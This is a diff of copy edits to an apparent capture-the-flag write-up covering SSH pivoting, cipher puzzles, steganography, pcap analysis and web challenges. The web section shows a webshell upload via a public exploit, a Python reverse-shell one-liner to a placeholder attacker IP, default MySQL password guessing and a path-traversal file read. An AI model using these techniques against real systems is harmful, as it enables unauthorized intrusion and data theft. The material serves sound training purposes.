@@ -67,7 +67,7 @@ I want to start this post out by saying a big thank you to all the organizers an
 
 
 
-We are given the username password and port to connect to a bastion host via SSH.
+We are given the username, password, and port to connect to a bastion host via SSH.
 
 In doing so we are presented with our first flag:
 
@@ -97,13 +97,13 @@ Simple enough.
 
 
 
-We are given "Browse to http://10.174.12.14"
+We are given "Browse to http://10.174.12.14".
 
 This is an internal IP, we will need to setup a proxy in order to browse internally to this host.
 
 We will accomplish this with proxychains and ssh with the following commands,
 
-First, we will setup a dynamic port forward over port 1080 on our local host to the bastion server via ssh on port 2222.
+First, we will setup a dynamic port forward over port 1080 on our localhost to the bastion server via ssh on port 2222.
 
 `ssh -D 1080 tunneler@164.90.147.46 -p 2222`
 
@@ -111,7 +111,7 @@ Next, we configure our proxychains config file (found in /etc/proxychains.conf) 
 
 `echo "socks4  127.0.0.1 1080" >> /etc/proxychains.conf`
 
-And lastly we use the following command to transfer data from the internal IP (rather than browsing to it):
+Lastly, we use the following command to transfer data from the internal IP (rather than browsing to it):
 
 `proxychains curl http://10.174.12.14`
 
@@ -137,7 +137,7 @@ Flag: `ts{TheFirstTunnelIsTheEasiest}`
 
 
 
-Now that we have our pivot setup we should be able to SSH into another host using proxychains:
+Now that we have our pivot setup, we should be able to SSH into another host using proxychains:
 
 `proxychains ssh whistler@10.218.176.199`
 
@@ -167,7 +167,7 @@ We are now tasked with connecting to an additional pivot.
 
 There are two ways to go about this, I will cover both.
 
-If we simply needed to connect to another host from our initial pivot and not establish another anchor point (second pivot) we could do this with a built in ssh command  (-J) that allows jumping from one SSH server to the next, some servers do not allow this, but in this case we can:
+If we simply needed to connect to another host from our initial pivot and not establish another anchor point (second pivot) we could do this with a built in ssh command  (-J) that allows jumping from one SSH server to the next. (Note: some servers do not allow this, but in this case we can):
 
 `proxychains ssh -J whistler@10.218.176.199 crease@10.112.3.12`
 
@@ -175,15 +175,15 @@ If we simply needed to connect to another host from our initial pivot and not es
 
 
 
-The other way to accomplish this and pivot further into a network would be to create another dynamic port forward onto the first pivot machine, thus allowing us to connect over proxychains to this host rather than jumping from the first pivot machine from the initial bastion host we established a dynamic port forward on.
+The other way to accomplish this, and pivot further into a network, would be to create another dynamic port forward on the first pivot machine (10.218.176.199), thus allowing us to connect to the second pivot server (10.112.3.12) via proxychains, rather than jumping from the first pivot machine using proxychains configured with the initial bastion host we established a dynamic port forward on.
 
-We need to specify a new port to dynamic forward through our localhost:
+We need to specify a new port to dynamically forward through our localhost:
 
 `proxychains ssh -D 1081 whistler@10.218.176.199`
 
 ![new-pivot](https://i.imgur.com/2NGTkxF.png)
 
-Now we simply update our proxychains.conf file to use the new dynamic port `1081`:
+Now, we simply update our proxychains.conf file to use the new dynamic port `1081`:
 
 ![proxychainsconf](https://i.imgur.com/TjlMExi.png)
 
@@ -212,7 +212,7 @@ Flag: `ts{TunnelsInTunnelsInTunnels}`
 
 I simply viewed the log file from Google Drive.
 
-A quick check review of the log shows fail2ban is configured to ban users over ssh.
+A quick review of the log file shows fail2ban has been configured to ban users over ssh.
 
 ![readlogs](https://i.imgur.com/yQmVZ0k.png)
 
@@ -237,14 +237,14 @@ For these set of challenges, the same log file is used.
 
 After careful review we locate each unique IP address that has been banned:
 
-92.252.94.69
-116.31.116.47
-47.202.16.90
-12.70.197.135
-91.224.160.108
-91.224.160.106
-108.58.9.206
-195.223.55.28
+92.252.94.69  
+116.31.116.47  
+47.202.16.90  
+12.70.197.135  
+91.224.160.108  
+91.224.160.106  
+108.58.9.206  
+195.223.55.28  
 
 {:refdef: .flag}
 Flag: `8`
@@ -269,7 +269,7 @@ The specific error we care about for this log entry is as follows:
 
 ![critical-error](https://i.imgur.com/BOExWpJ.png)
 
-A simple CTRL+F find all search on this log file on "CRITICAL Unable to restore environment" gives us the flag: 48
+A simple CTRL+F find all search on this log file for "CRITICAL Unable to restore environment" gives us the number of occurences the fail2ban service reached an unrecoverable state (a.k.a our flag): 48
 
 {:refdef: .flag}
 Flag: `48`
@@ -288,11 +288,11 @@ Flag: `48`
 
 
 
-We are searching for specific instances where the IP address is getting banned rather than reports of IPs that have already been banned.
+For this challenge, we are searching for specific instances where the IP address is getting banned, rather than the reporting of IP's that have already been banned.
 
-Another use for CTRL+F through our web browser searching for "Ban <ip-address>":
+Another use of CTRL+F through our web browser searching for "Ban <ip-address>":
 
-This provides us with the following matches on IP Address: `116.31.116.47`
+This provides us with the number of occurences of matches on IP Address: `116.31.116.47`
 
 ![mostfreq](https://i.imgur.com/3r9qh1Y.png)
 
@@ -336,15 +336,16 @@ Flag: `ts{IsThisEncryption}`
 
 
 
-Another base64 encoded string?....
+Another base64 encoded string?...
 
 ![base64maybe](https://i.imgur.com/0MgY3dv.png)
 
-Nope. Let's try another base format.
+Nope.   
+Let's try another base format.
 
 ![base32](https://i.imgur.com/N9QHqPm.png)
 
-Base32 it is...yawn.
+Base32 it is...*yawn*.
 
 {:refdef: .flag}
 Flag: `ts{ThisIstotallyEncryption!}`
@@ -363,7 +364,8 @@ Flag: `ts{ThisIstotallyEncryption!}`
 
 
 
-The title "n Eggs" gives us a hint this is a Bacon Cipher.
+The title "n Eggs" gives us the hint that this may be a Bacon Cipher.  
+Bacon cipher it is.
 
 Output: "TSBACONISMYNAME"
 
@@ -384,11 +386,11 @@ Flag: `TSBACONISMYNAME`
 
 Based on the format of this string, this looks like the flag but just rotated.
 
-Could it be the best encryption of all time ROT-13?
+Could it be the best encryption of all time ROT-13?!
 
 "TSANOLDIEBUTAGOODIE"
 
-They should've used ROT-26.
+They should've used ROT-26, double the encryption next time.
 
 {:refdef: .flag}
 Flag: `TSANOLDIEBUTAGOODIE`
@@ -407,9 +409,10 @@ Flag: `TSANOLDIEBUTAGOODIE`
 
 
 
-Doing a quick Google Search on AFSC 29331 we learn this is an Air Force Specialty Code.
+Doing a quick Google Search on "AFSC 29331", we learn this is an Air Force Specialty Code.
 
 The string itself looks like morse code.
+The translation of morse code is as follows:
 
 "DUTY BOPPERS"
 
@@ -430,7 +433,7 @@ Flag: `DUTY BOPPERS`
 
 
 
-The title gives us a hint this is likely a Rail Fence (Zig-Zag) Cipher.
+The title gives us a hint that this is likely a Rail Fence (Zig-Zag) Cipher.
 
 Specifically with a height of 3.
 
@@ -455,7 +458,7 @@ This was actually my favorite cipher challenge.
 
 As we can tell, the numbers above range from as low as 3 to as high as 20.
 
-My gut told me this was simply a numerical representation of alphabetical characters.
+My instinct told me this was simply a numerical representation of alphabetical characters.
 
 Let's translate it and check:
 
@@ -484,27 +487,28 @@ Let's browse to it and start our enumeration.
 
 ![gym-management-system](https://i.imgur.com/ediy2A7.png)
 
-As we can see we are presented with some "Gym Management System 1.0" webapp software.
+As we can see, we are presented with a "Gym Management System 1.0" webapp software.
 
-There is a login URL but let's do a quick check for any known vulnerabilities for this software.
+There is a login for the site, but let's do a quick check for any known vulnerabilities for this software.
 
 ![gym-rce](https://i.imgur.com/7D78x3x.png)
 
-Hey that looks promising, let's check out the source code.
+Hey, that looks promising, let's check out the source code.
 
-https://www.exploit-db.com/exploits/48506
+![https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)
 
-Looks like this python script will perform uploading a php webshell through an unauthenticated file upload vulnerability. Let's give it a go.
+It looks like this python script will perform the uploading of a php webshell through an unauthenticated file upload vulnerability.  
+Let's give it a go.
 
 ![webshell](https://i.imgur.com/jKsQt1t.png)
 
-Sweet ascii art.
+Sweet ascii art!
 
 Now to find the flag on the root of the filesystem:
 
 ![flag](https://i.imgur.com/KfS3qgv.png)
 
-That was an easy shell to pop, no kidding.
+That was an easy shell to pop. No kidding.
 
 {:refdef: .flag}
 Flag: `ts{ThatWasAnEasyShelltoPop}`
@@ -527,7 +531,7 @@ Now that we have our webshell, let's get a full shell on this host to make enume
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacking-ip>",6669));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-On out attacking server we setup a netcat listener:
+On our attacking server we setup a netcat listener:
 
 `nc -nvlp 6669`
 
@@ -535,7 +539,7 @@ Once we catch the reverse shell we'll want to spawn a TTY:
 
 `python -c 'import pty; pty.spawn("/bin/sh")'`
 
-Now that we have a nice working shell we can check for the IP address of the mysql server.
+Now that we have a nice working shell, we can check for the IP address of the mysql server.
 
 I went ahead and ran `ps aux | grep mysql` to look for a running instance of mysql:
 
@@ -562,7 +566,10 @@ Next, we need to locate the root password of the SQL server account.
 
 Well, we know from running our previous `ps aux | grep mysql` command that the www-data user has an active session connecting to the "gym" database on the SQL server with the root account.
 
-Let's try some default passwords: root:root doesn't work. root:toor works!
+Let's try some default passwords:
+`root:root` doesn't work. 
+Maybe `root:toor`.
+There we go!
 
 `mysql -h 10.213.12.10 -u root -p`
 
@@ -584,34 +591,36 @@ Flag: `toor`
 ![lets-have-some-sql-fun-1](https://i.imgur.com/Bg2xg8z.png)
 
 
-
-We already have a real shell hehe.
+"Now you need to get a real shell."
+One step ahead of you. ;)
 
 Let's see if we can locate the admin user.
 
-First we will use the following command to use the "gym" database from MySQL:
+First, we will use the following command to connect to the "gym" database from MySQL:
 
 `use gym;`
 
-Next let's take a look at the tables.
+Next, let's take a look at the tables on the "gym" database.
 
 `show tables;`
 
 ![tables](https://i.imgur.com/f5lwkp5.png)
 
-Members is likely the table we care about for this challenge. Let's check the columns for the members table.
+The "members" table sounds particularly useful. 
+Let's check the columns for the members table.
 
 `select columns from members;`
 
 ![columns](https://i.imgur.com/ywGaGVu.png)
 
-Ok, so let's select members from the "admin" column who's value is 1.
+Okay, now let's select members from the "admin" column who's value is equal to 1.
+This should yield any admin users found in the "members" table.
 
 `select * from members where admin = 1;`
 
 ![admin](https://i.imgur.com/tbtSkKh.png)
 
-James is our admin.
+"James" is our admin.
 
 {:refdef: .flag}
 Flag: `James`
@@ -638,7 +647,7 @@ Let's check for members whose "currentmembership" = 1, meaning they have a curre
 
 `select * from members where currentmembership =1;`
 
-This gives us 5016 rows or members for output.
+This gives us 5016 rows (or members) for output.
 
 ![currentmembership](https://i.imgur.com/SaRgGlS.png)
 
@@ -671,7 +680,7 @@ Locations should tell us the different locations we will want to enumerate membe
 
 ![locations-table](https://i.imgur.com/PBz2Enf.png)
 
-Okay, so we have our locations and their respective id's, now we simply need to check the number of members for each location, we'll choose the location with the most rows or members from the results.
+Okay, so we have our locations and their respective id's, now we simply need to check the number of members for each location. We'll choose the location with the most rows (or members) from the results.
 
 `select * from members where gymlocation = 0`
 
@@ -702,7 +711,7 @@ Flag: `Austin`
 
 ![lets-have-some-sql-fun-4](https://i.imgur.com/dnJPRTU.png)
 
-Now for the last flag in this category we will need to locate first failed login attempt by year.
+Now for the last flag in this category we will need to locate the first failed login attempt by year.
 
 Let's take a look at the tables once more:
 
@@ -710,7 +719,7 @@ Let's take a look at the tables once more:
 
 ![tables](https://i.imgur.com/dDSnRyU.png)
 
-Login_attempts likely has the information we are looking for.
+"login_attempts" likely has the information we are looking for.
 
 Let's check the columns for this table:
 
@@ -724,13 +733,13 @@ Okay, so the third column is of most interest to us. Let's see the values for th
 
 ![login_attempts](https://i.imgur.com/cO6zhYz.png)
 
-Okay so we have numbers ranging from 1402641415-1597006651 or higher.
+Okay, so we have numbers ranging from 1402641415-1597006651 or higher.
 
-These timestamps are epochs, we will need to convert these to a human readable time format.
+These timestamps are epochs. We will need to convert these to a human-readable time format.
 
 ![epoch-to-human](https://i.imgur.com/zWk8cli.png)
 
-Great, so it looks like 15XXXXXXX is from year 2020, let's try showing only values of login_attempts from lower values, let's say 1400000000.
+Great, so it looks like 15XXXXXXX is from year 2020. Let's try showing only values of login_attempts from lower values. Let's say 1400000000.
 
 `select * from login_attempts where time <= 1400000000`
 
@@ -740,7 +749,8 @@ Let's check lower than 1380000000
 
 `select * from login_attempts where time <= 13800000000`
 
-Empty set. It looks like the lowest value is at least 139XXXXXXX
+This query returns "Empty set". 
+It looks like the lowest value is at least 139XXXXXXX
 
 This gives us the following year: `2014`
 
@@ -773,15 +783,15 @@ Enumerating the  website we find the following in the robots.txt file:
 
 ![robots.txt](https://i.imgur.com/LpgUZlF.png)
 
-Unfortunately, it's the challenge is not as simple as browsing to /etc/flag.txt through the URI.
+Unfortunately, the challenge is not as simple as browsing to /etc/flag.txt through the URL.
 
-Let's see if we can find this file with a vulnerability.
+Let's see if we can find the "/etc/flag.txt" file with a vulnerability.
 
-At the top we see a search bar, maybe there is a local file inclusion vulnerability through the search function.
+At the top we see a search bar. Maybe there is a local file inclusion vulnerability through the search function.
 
 ![search-lfi](https://i.imgur.com/BMO6loa.png)
 
-Sure enough, by searching for ../../etc/flag.txt we are returned with the output of /etc/flag.txt
+Sure enough, by searching for "../../etc/flag.txt" we are returned with the output of /etc/flag.txt
 
 {:refdef: .flag}
 Flag: `TS{SheDidItDotDotDotty}`
@@ -798,25 +808,25 @@ Flag: `TS{SheDidItDotDotDotty}`
 
 ![tigers-never-let-you-down](https://i.imgur.com/rQPE6WS.png)
 
-I'll be honest, this one took me a little while to figure out. But it finally clicked, let's walk through the process.
+I'll be honest, this one took me a little while to figure out. But it did click eventually, let's walk through the process.
 
 We know from the webapp that there is a "Joe's Tracks" directory.
 
-Browsing here "http://164.90.157.234:8000/joe.php"
+Browsing here: "http://164.90.157.234:8000/joe.php"
 
 We see images of popular albums, including the ever popular "Joe Exotic's - Tiger King" album.
 
 ![joes-tracks](https://i.imgur.com/TZm9bOD.png)
 
-My initial thought was there is either another web vulnerability chained from the location of this album image, or steganography on the album art itself.
+My initial thought was there may be either another web vulnerability chained from the location of this album image or that the album art has hidden steganopgrahy.
 
-Browsing to "Joe Exotic's - Tiger King" album art we see some password lock layer on top of the image. This must be steganography right? Let's check the directory the .jpg is in.
+Browsing to "Joe Exotic's - Tiger King" album art we see a password lock layer on top of the image. This must be steganography right? Let's check the directory the JPEG file is in.
 
 "http://164.90.157.234:8000/album/"
 
 ![tigerkingalt-hmm](https://i.imgur.com/DUWDmxg.png)
 
-Hmm, so there is the original tigerking.jpg album and a tigerking_alt.jpg image.
+Hmm, so there is the original tigerking.jpg album and a tigerking_alt.jpg image...
 
 Let's check for hidden data in the original image.
 
@@ -824,13 +834,15 @@ Let's check for hidden data in the original image.
 
 ![steghide1](https://i.imgur.com/0onvjc8.png)
 
-Okay, so we located a troll.txt file from the image that contains a base64 string that decodes to a youtube link. We are about to get rick rolled. Yep.
+Okay, so we locate a troll.txt file from the image. This troll.txt file contains a base64 encoded string that, when decoded, provides a youtube link. 
+We are about to get rick rolled. 
+Yep, rick roll.
 
 At this point I checked the tigerking_alt.jpg image for steganography before circling back to this challenge.
 
-However, the point that clicked was the connection between the rick roll and the title of the challenge "Tigers Never Let You Down".
+Eventually I came back to this challenge. The point that clicked for me, was the connection between the rick roll and the title of the challenge: "Tigers Never Let You Down".
 
-Checking the entire list of jpg files in the album directory, we locate a "rickastley.jpg" image.
+Checking the entire list of JPEG files in the album directory, we locate a "rickastley.jpg" image.
 
 "http://164.90.157.234:8000/album/rickastley.jpg"
 
@@ -842,7 +854,7 @@ Let's download this file and check it with steghide.
 
 ![rickstegly](https://i.imgur.com/RzDzkuU.png)
 
-We found our flag!
+We've found our flag!
 
 {:refdef: .flag}
 Flag: `TS{NeverGonnaLetYouFindMyExHusbandsBody}`
@@ -923,7 +935,7 @@ Let's download this image and check for steganography.
 
 Initially, I tried adjusting the images brightness, contrast, and color levels (red, blue, and green), all to no avail.
 
-Steghide didn't yield any hidden content either, time to try some other stuff.
+Steghide didn't yield any hidden content either. Time to try some other stuff.
 
 Running strings on the file shows some interesting content:
 
@@ -943,7 +955,7 @@ Let's use "dd" to extract the contents.
 
 ![dd](https://i.imgur.com/cIk4oUF.png)
 
-We are unable to zip the file as it is password protected.
+We are unable to unzip the file as it is password protected.
 
 Let's use fcrackzip to attempt to bruteforce the password with rockyou.txt wordlist.
 
@@ -976,7 +988,7 @@ We download the "strings.c" file and compile it using GCC.
 
 `gcc -o strings strings.c`
 
-Checking our newly compiled "strings" file with strings we see the flag in the output but it has been mangled.
+Checking our newly compiled "strings" file with strings we see the flag in the output, but it has been mangled.
 
 Let's try viewing this compiled binary in a memory hex viewer such as "xxd".
 
@@ -1001,11 +1013,12 @@ Flag: `ts{DidYouUseStringsorMaths}`
 
 ![tom-nook-1a](https://i.imgur.com/oYxfsph.png)
 
-We are given 7zipped archive containing a packet capture file.
+We are given a 7zipped archive containing a packet capture file.
 
 `7z x TomNookInternetTraffic.7z`
 
-Now, let's open this pcap file in Wireshark 
+Let's open this pcap file in Wireshark.
+By checking the contents of the packet capture we find the first flag in the 7th entry of transmission data. 
 
 ![wireshark-pcap](https://i.imgur.com/RAbhaxZ.png)
 
@@ -1024,7 +1037,7 @@ Flag: `TS{TomNookUsesTheInternet}`
 
 ![tom-nook-1b](https://i.imgur.com/ckSIIBq.png)
 
-Analyzing the pcap file from the screenshot in the first challenge we find the source IP:
+By analyzing the pcap file from the screenshot in the first challenge we locate the source IP:
 
 Source: 192.168.1.47
 
@@ -1043,7 +1056,7 @@ Flag: `192.168.1.47`
 
 ![tom-nook-1c](https://i.imgur.com/zkq2ml3.png)
 
-Now we simply need to locate the destination rather than the source with the pcap file.
+Now, we simply need to locate the destination IP rather than the source IP within the pcap file.
 
 Destination: 161.35.110.243
 
@@ -1062,7 +1075,7 @@ Flag: `161.35.110.243`
 
 ![tom-nook-1d](https://i.imgur.com/EKxC9uA.png)
 
-Further analysis of the packet captures and we find the following filename:
+Further analysis of the packet captures yields the following filename:
 
 ![filename](https://i.imgur.com/PaQG8zD.png)
 
@@ -1081,7 +1094,7 @@ Flag: `SecretACBankStatement.zip`
 
 ![tom-nook-1e](https://i.imgur.com/c5jNhm4.png)
 
-We locate the "SecretACBankStatement.zip" file and use the Export Packet Bytes... tool to extract the zip file.
+We locate the "SecretACBankStatement.zip" file and use the "Export Packet Bytes..." tool to extract the zip file.
 
 ![zip-extract](https://i.imgur.com/kaB2Anw.png)
 
@@ -1108,7 +1121,7 @@ Flag: `monkey123`
 
 ![tom-nook-1f](https://i.imgur.com/njjBgOD.png)
 
-Lastly, we need to simply unzip the contents and find the flag in the PDF.
+Lastly, we need to unzip the contents and locate the flag inside the PDF.
 
 ![unzip](https://i.imgur.com/syXLl22.png)
 
